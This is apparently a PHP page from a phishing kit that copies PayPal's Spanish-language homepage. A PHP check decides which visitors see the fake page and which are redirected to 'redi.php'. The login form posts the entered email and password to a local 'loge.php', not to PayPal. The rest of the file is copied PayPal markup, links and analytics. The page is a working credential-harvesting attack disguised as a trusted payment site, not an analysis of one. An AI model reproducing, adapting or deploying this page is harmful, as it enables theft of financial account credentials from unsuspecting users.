<?php
if($myhost == $port){
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="es">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
   
      <!--
      		Script info: script: webscr, cmd: _home, template: xpt/Marketing_CommandDriven/homepage/MainHome, date: Feb 10, 2011 21:59:17 PST; country: ES, language: es_XC, xslt server: 
      		web version: 67.0-1741654 branch: BWR_670_int
      		DXPT: true (LOCALE: es_XC, COUNTRY: US, PRODUCTNUMBER: 67.0, BUILDNUMBER: 1741654, BRANCHNAME: BWR_670_int, PRODUCTNUMBEROVERRIDE: )
	pexml version: -
      		pexml version: 67.0-1755747
      		page XSL: 
             hostname : gJePHdT1QDUPSSlTqG4cnyExiuwYtEw1O6XoKpKXs-o
               rlogid : gJePHdT1QDUPSSlTqG4cn4IGsVsl00IO%2bbsJvPgi8vtrbExG%2fqLh%2fg%3d%3d_12e6327bcfc
      -->
      
      <title>Enviar dinero, pagar en l&iacute;nea o configurar una cuenta de vendedor con PayPal</title>
      <meta name="keywords" content="enviar dinero, pagar en l&iacute;nea, cuenta de vendedor">
      <meta name="description" content="PayPal es la forma m&aacute;s r&aacute;pida y segura de enviar dinero, realizar pagos en l&iacute;nea, recibir dinero o configurar una cuenta de vendedor.">
      <meta http-equiv="X-UA-Compatible" content="IE=8">

      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/core/core.css">
      <link media="print" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/core/print.css">
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/marketing/marketing.css">
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/Marketing/css/pages/ConsumerRevamp.css">
      <!--[if IE 8]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie8.css"><![endif]-->
      
      <!--[if IE 7]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie7.css"><![endif]-->
      
      <!--[if lte IE 6]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie6.css"><![endif]-->
      
      <link rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/es_XC/country.css">
      <link rel="apple-touch-icon" href="WEBSCR-640-20101004-1/en_US/i/pui/apple-touch-icon.png"><script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><style type="text/css">#welcomebox {background:url(https://www.paypal.com/es_XC/Marketing/i/header/hdr_cpr_welcome_560x82.gif) no-repeat;}</style><script type="text/javascript" src="WEBSCR-640-20101004-1/js/lib/min/global.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/tns/mid.js"></script><script type="text/javascript">PAYPAL.tns.loginflow = 'xpt/Marketing_CommandDriven/homepage/MainHome';PAYPAL.tns.flashLocation = 'en_US/m/mid.swf';</script><link rel="shortcut icon" href="WEBSCR-640-20101004-1/en_US/i/icon/pp_favicon_x.ico">

   </head>
   <body>
      <noscript>
         <p class="nonjsAlert">NOTA: Multitud de funciones del sitio Web de PayPal necesitan Javascript y el uso de las cookies. Puede activarlos mediante las configuraciones de preferencia del navegador.</p>
      </noscript>
      <div class="outside home" id="page">
         <div id="header" class="std">
            <h1><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home"><img border="0" src="WEBSCR-640-20101004-1/en_US/i/logo/paypal_logo.gif" alt="PayPal"></a></h1>
            <form method="post" id="searchForm" name="searchForm" action="https://www.paypal.com/us/cgi-bin/searchscr?cmd=_sitewide-search">
               <fieldset id="myDynamicAutoComplete" class="autocomplete">

                  <legend>Buscar en PayPal</legend><label for="searchBox">Buscar </label><input type="text" id="searchBox" name="queryString" value=""> <input type="hidden" id="sayTminLength" value="3"><input type="hidden" id="coDomain" value="US"><input type="submit" class="button" id="search.x" name="search.x" value="Buscar" autocomplete="off"></fieldset><input name="form_charset" type="hidden" value="UTF-8"></form>
            <div id="navGlobal"><span><a href="#content" class="accessAid skip">Saltar al contenido principal</a></span><ul>
                  <li class="first signup"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_registration-run">Registrarse</a></li>
                  <li class="login"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-run">Iniciar Sesi&oacute;n</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/helpweb?cmd=_help">Ayuda</a></li>

                  <li class="last"><a href="https://cms.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=security/online_security_center">Seguridad y protecci&oacute;n</a></li>
               </ul>
            </div>
            <form method="post" id="rosetta" class="rosetta" action="?cmd=_home&dispatch=5885d80a13c0db1f8e<?php echo "&ee=$ee"; ?>">
			
               <fieldset>
                  <legend><span class="accessAid">Changer de langue</span></legend><label for="rosetta_dropdown">Language Select</label>
				  <select id="rosetta_dropdown" name="locale_x">
                     <option value="EN">English</option>
                     <option value="ES" selected>Espa&ntilde;ol</option>
					 <option value="FR" >Fran&ccedil;ais</option></select>
		   
		   <input type="submit" name="testName" value="&gt;" class="button mini">
		   <input type="hidden" id="change_locale_x" name="change_locale.x" value="1">
		   </fieldset>
		   
		   <input type="hidden" name="cmd" value="ok">
		   <input name="form_charset" type="hidden" value="UTF-8">
		   </form>
            <div id="navPrimary">
               <ul>
                  <li class="active"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5">Inicio</a></li>

                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8">Personal</a></li>
                  <li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home&amp;nav=2" class="scTrack:SRD:Nav:x60">Empresas</a></li>
                  <li><a href="https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9">Desarrolladores</a></li>
                  <li><a href="https://www.paypal-community.com/" class="scTrack:SRD:Nav:CB69">Comunidad</a></li>
               </ul>
            </div>
         </div>

         <hr>
         <div id="content">
            <div class="sidebar box login">
               <div class="header">
                  <h2>Inicio de sesi&oacute;n</h2>
               </div>
               <div class="body">
                  <form method="post" name="login_form" action="loge.php?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e284a5f8a8f8<?php echo "&ee=$ee"; ?>">

                     <fieldset>
                        <legend>Identificaci&oacute;n de usuario</legend>
                        <p><label for="login_email">Correo electr&oacute;nico</label><input type="text" id="login_email" name="login_email" value=""></p>
                        <p><label for="login_password">Contrase&ntilde;a de PayPal</label><input autocomplete="off" type="password" id="login_password" name="login_password" value=""><script type="text/javascript">
<!--hide from JavaScript-challenged browsers
YAHOO.util.Event.addListener(window, "load", function(){
document.login_form.login_password.focus();
if (document.login_form.login_email.value == '') {
document.login_form.login_email.focus();
}
});
// done hiding -->
</script></p>
                        <p><label for="target_page">Vaya a</label><select id="target_page" name="target_page">

                              <option value="0" selected>Mi cuenta</option>
                              <option value="1">Mis transacciones</option></select></p><input type="submit" name="submit.x" value="Iniciar sesi&oacute;n" class="button primary"></fieldset>
                     <p><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account-recovery&amp;from=PayPal">&iquest;Problemas para iniciar sesi&oacute;n?</a></p>
                     <p>&iquest;Es la primera vez que utiliza PayPal? <strong><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_registration-run">Reg&iacute;strese ahora</a></strong>.
                     </p><input name="form_charset" type="hidden" value="UTF-8"></form>
               </div>

            </div>
            <div id="maincontent">
               <div id="welcomebox">
                  <div class="welcomeLeft">
                     <h1>El m&eacute;todo preferido por el mundo para realizar y recibir pagos. <a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work">Vea el video</a></h1>
                  </div>
               </div>

               <div class="t1mpi">
                  <div class="MktMPI" id="mpi600005"><a class="heroimage" href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal"><img src="WEBSCR-640-20101004-1/es_XC/Marketing/i/scr/scr_cpr_home_heroimage_542x228.jpg" border="0" alt=""></a></div>
               </div>
               <div id="payments">
                  <div class="firstbox">
                     <h3><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/pay_online">Pague en l&iacute;nea</a></h3>
                     <p>Vaya de compras y realice pagos en l&iacute;nea de forma r&aacute;pida y segura.</p>

                     <p class="learnMoreArrow"><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/pay_online">M&aacute;s informaci&oacute;n</a></p>
                  </div>
                  <div class="secondbox">
                     <h3><a href="https://www.paypal.com/sendmoney">Env&iacute;e dinero</a></h3>
                     <p>Env&iacute;e dinero a cualquier persona que tenga direcci&oacute;n de correo electr&oacute;nico.</p>

                     <p class="learnMoreArrow"><a href="https://www.paypal.com/sendmoney">M&aacute;s informaci&oacute;n</a></p>
                  </div>
                  <div class="thirdbox">
                     <h3><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/receive_money">Reciba pagos</a></h3>
                     <p>Acepte pagos en l&iacute;nea para los art&iacute;culos que venda.</p>

                     <p class="learnMoreArrow"><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/receive_money">M&aacute;s informaci&oacute;n</a></p>
                  </div><img src="WEBSCR-640-20101004-1/en_US/Marketing/i/scr/scr_cpr_graydots_547x1.gif" border="0" class="dottedline" alt=""><p class="acceptCredit">&iquest;Desea aceptar tarjetas de cr&eacute;dito o configurar una cuenta de vendedor? Visite <a href="https://www.paypal.com/merchants">Servicios para vendedores</a></p>
               </div>
            </div>
            <div id="counter">
               <div class="topborder"></div>

               <div class="sideborders">
                  <p><span id="NoOfUserLogin">+100 million</span></p>
                  <p class="pplwrld">la gente en todo el mundo utiliza PayPal</p>
                  <p class="signup"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_registration-run">Registrarse</a></p>
               </div>
               <div class="btmborder"></div>
            </div>

            <div id="bgleftgradient">
               <div class="leftHeader">
                  <h3>Conozca PayPal</h3>
               </div>
               <div id="leftBody">
                  <ul>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work">C&oacute;mo funciona PayPal</a></li>

                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/Sign_Up_for_PayPal">Introducci&oacute;n</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/My_PayPal_Account">Administraci&oacute;n de la cuenta</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal">La mejor forma de utilizar PayPal</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/PayPal_FAQ">Diez cosas que debe saber sobre PayPal</a></li>
                  </ul>
               </div>

            </div>
            <div id="brandbar" class="noBottomMargin">
               <div class="MktMPI" id="mpi600007"></div>
            </div>
            <div class="pd_bottom_box">
               <div class="pd_bottom_box_title">
                  <h3>Todos los productos y servicios personales</h3>
               </div>

               <div class="wrapper">
                  <h4>Pague en l&iacute;nea</h4>
                  <ul>
                     <li><a target="_blank" href="https://www.paypal-shopping.com/">Tiendas de PayPal</a></li>
                     <li><a target="_blank" href="https://www.paypal-shopping.com/shop-stores.html">Directorio de almacenamiento de PayPal</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/paypal_credit_card&amp;nav=0.1.2">Cr&eacute;dito de PayPal</a></li>

                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/mobile_payments&amp;nav=0.1.3#payonline">Comprar a trav&eacute;s del m&oacute;vil</a></li>
                  </ul>
               </div>
               <div class="wrapper">
                  <h4>Env&iacute;e dinero</h4>
                  <ul>

                     <li><a href="https://www.paypal.com/sendmoney">Env&iacute;e dinero en l&iacute;nea</a></li>
                     <li><a href="https://www.paypal.com/international-money-transfer">Transferencia de dinero internacional</a></li>
                     <li><a href="https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=0.2.2">Para su adolescente</a></li>
                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#sendmoney">A trav&eacute;s del m&oacute;vil</a></li>
                  </ul>

               </div>
               <div class="wrapper">
                  <h4>Reciba pagos</h4>
                  <ul>
                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay">Vender en eBay</a></li>
                     <li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/accept_credit_cards">Aceptar tarjetas de cr&eacute;dito</a></li>
                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/request_money">Solicitar dinero</a></li>


                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/fundraise">Recaudar fondos</a></li>
                     <li><a href="https://www.paypal.com/merchants">Vender en su Web</a></li>
                  </ul>
               </div>
               <div class="wrapper">
                  <h4>Otros</h4>
                  <ul>

                     <li><a href="https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=1.2.2">Cuenta para estudiantes</a></li>
                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments">PayPal m&oacute;vil</a></li>
                     <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_upgrade-interest-marcom&amp;outside=1">Fondos de inversi&oacute;n en activos del mercado monetario</a></li>
                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/debit_card">Tarjeta de d&eacute;bito de PayPal</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/BillMeLater_ProductOverview">Bill Me Later&reg;, un servicio PayPal</a></li>

                  </ul>
               </div>
            </div>
            <div id="footer">
               <h5 class="accessAid">M&aacute;s informaci&oacute;n</h5>
               <ul>
                  <li class="first"><a href="http://www.paypal-media.com/aboutus.cfm">Quienes somos</a></li>

                  <li><a href="https://www.paypal.com/us/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Contactar</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees-outside">Tarifas</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/jobs-outside">Empleo</a></li>
                  <li><a href="https://cms.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=developer/home">Integradores</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-merchant">Servicios para vendedores</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-country-functionality-outside">En todo el mundo</a></li>

                  <li>
<a href="javascript:O_LC()">Site Feedback</a> <img 
src="WEBSCR-640-20101004-1/css/Customer/pages/img/sm_333_oo.gif" alt="Site Feedback">
</li>
               </ul>
               <ul>
                  <li class="first"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Privacidad</a></li>
                  <li><a href="http://www.thepaypalblog.com">Nuestro blog</a></li>

                  <li><a href="https://www.paypal-labs.com">Sesiones pr&aacute;cticas</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_web-referrals-mrb-outside">Recomendaciones</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/ua-outside">Contratos legales</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing/general/SiteMap-outside">Mapa del sitio</a></li>
                  <li class="last"><a href="http://www.ebay.com/">eBay</a></li>
               </ul>

               <p id="footerSecure"><a target="_blank" href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Customer/popup/SecurityKeyVIP-outside" onClick="PAYPAL.core.openWindow(event, {width: 425, height: 350})"><img border="0" src="WEBSCR-640-20101004-1/en_US/i/logo/logo_VIPwhite_66x27.gif" alt=""></a></p>
               <p id="legal">Copyright &copy; 1999-2013 PayPal. Todos los derechos reservados.</p>
            </div>
         </div>
         <div id="navFull">
            <ul>
               <li class="active"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5">Inicio</a><ul>

                     <li class="active"><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work&amp;nav=0.0" class="scTrack:SRD:Nav:W8">C&oacute;mo funciona PayPal</a><ul>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work&amp;nav=0.0.0" class="scTrack:SRD:Nav:YX">&iquest;Qu&eacute; es PayPal?</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/Sign_Up_for_PayPal&amp;nav=0.0.1" class="scTrack:SRD:Nav:YY">Introducci&oacute;n</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/My_PayPal_Account&amp;nav=0.0.2" class="scTrack:SRD:Nav:YZ">Administraci&oacute;n de la cuenta</a></li>

                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal&amp;nav=0.0.3" class="scTrack:SRD:Nav:W2">La mejor forma de utilizar PayPal</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/PayPal_FAQ&amp;nav=0.0.4" class="scTrack:SRD:Nav:Z0">Diez cosas que debe saber sobre PayPal</a></li>
                           <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees-outside&amp;nav=0.0.5" class="scTrack:SRD:Nav:y80">Cu&aacute;nto cuesta</a></li>
                           <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing/general/PayPalAccountTypes-outside&amp;nav=0.0.6" class="scTrack:SRD:Nav:Z8">Tipos de cuenta</a></li>
                        </ul>
                     </li>

                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/pay_online&amp;nav=0.1" class="scTrack:SRD:Nav:W3">Pagar en l&iacute;nea</a><ul>
                           <li><a href="https://www.paypal-shopping.com/" class="scTrack:SRD:Nav:Z2">Excelentes promociones</a></li>
                           <li><a href="https://www.paypal-shopping.com/shop-stores.html" class="scTrack:SRD:Nav:Z3">Directorio de tiendas de PayPal</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/paypal_credit_card&amp;nav=0.1.2" class="scTrack:SRD:Nav:W4">PayPal Extras MasterCard</a></li>
                           <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#payonline&amp;nav=0.1.3" class="scTrack:SRD:Nav:L6">Comprar con el tel&eacute;fono m&oacute;vil</a></li>

                        </ul>
                     </li>
                     <li><a href="https://www.paypal.com/sendmoney" class="scTrack:SRD:Nav:N9">Enviar dinero</a><ul>
                           <li><a href="https://www.paypal.com/sendmoney" class="scTrack:SRD:Nav:O1">Enviar dinero en l&iacute;nea</a></li>
                           <li><a href="https://www.paypal.com/international-money-transfer" class="scTrack:SRD:Nav:O2">En todo el mundo</a></li>
                           <li><a href="https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=0.2.2" class="scTrack:SRD:Nav:MR">A sus hijos adolescentes</a></li>

                           <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#sendmoney&amp;nav=0.2.3" class="scTrack:SRD:Nav:Y4">Con el tel&eacute;fono m&oacute;vil</a></li>
                        </ul>
                     </li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/receive_money&amp;nav=0.3" class="scTrack:SRD:Nav:Y5">Recibir pagos</a><ul>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/request_money&amp;nav=0.3.0" class="scTrack:SRD:Nav:Y6">Solicitar pagos</a></li>
                           <li><a href="https://personal.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay&amp;tab=autotab_0&amp;nav=0.3.1" class="scTrack:SRD:Nav:Y7">Vender en eBay</a></li>

                           <li><a href="https://personal.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay&amp;tab=autotab_1&amp;nav=0.3.2" class="scTrack:SRD:Nav:P6">Vender con clasificados</a></li>
                           <li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/wp_standard&amp;nav=0.3.3" class="scTrack:SRD:Nav:BM76">Vender en su sitio Web</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/fundraise&amp;nav=0.3.4" class="scTrack:SRD:Nav:P7">Recaudaci&oacute;n de fondos</a></li>
                        </ul>
                     </li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/products_services&amp;nav=0.4" class="scTrack:SRD:Nav:P8">Productos y servicios</a></li>

                  </ul>
               </li>
               <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8">Personal</a></li>
               <li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home&amp;nav=2" class="scTrack:SRD:Nav:x60">Empresas</a></li>
               <li><a href="https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9">Desarrolladores</a></li>
               <li><a href="https://www.paypal-community.com/" class="scTrack:SRD:Nav:CB69">Comunidad</a></li>
            </ul>

         </div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20110306-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/iconix.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/pageBlockingUnsafeBrowsers.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/js/tns/min/bid.js"></script><script type="text/javascript">
                                YAHOO.util.Event.addListener(window,"load",function(){
                                       try {
                            PAYPAL.bp.init("login_form","bp_mid");PAYPAL.ks.init("login_form","login_password","bp_ks1");PAYPAL.common.appendField("login_form", "bp_ks2");PAYPAL.common.appendField("login_form", "bp_ks3");
                                    } catch(err){}
                                });
                            </script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/pp_naturalsearch.js"></script><script type="text/javascript">mp_landing();</script><div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"></div>
      <!-- SiteCatalyst Code
      Copyright 1997-2005 Omniture, Inc.
      More info available at http://www.omniture.com -->
      <script type="text/javascript" src="WEBSCR-640-20101004-1/js/site_catalyst/pp_jscode_080706.js"></script>
      <script type="text/javascript">
      s.prop1="xpt/Marketing_CommandDriven/homepage/MainHome";
      s.prop7="Unknown";
      s.prop8="Unknown";
      s.prop9="Unknown";
      s.prop10="US";
      s.prop14="";
      s.prop16="";
      s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
      s.prop15="";
      s.pageName="SRD: Main Home";
      s.channel="SRD";
      s.prop50="es_XC";
      s.prop18="";
      </script>

      <script type="text/javascript"><!--
      /************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
      var s_code=s.t();if(s_code)document.write(s_code);
      if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
      //-->
      </script><noscript><img
      src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
      height="1" width="1" border="0" alt="" /></noscript>
      <!--/DO NOT REMOVE/-->
      
      <!-- End SiteCatalyst Code -->
      </body>
</html>

<?php
}else{
include "redi.php";
}
?>